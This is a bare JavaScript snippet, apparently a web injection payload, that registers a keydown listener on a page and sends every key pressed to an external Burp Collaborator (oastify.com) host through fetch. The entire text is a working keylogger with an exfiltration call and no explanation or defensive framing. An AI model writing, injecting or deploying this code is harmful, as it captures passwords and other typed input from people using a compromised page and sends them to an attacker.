function logKey(event){
	fetch("https://7aisk2irsh853llusg54n1imqdw4ky8n.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
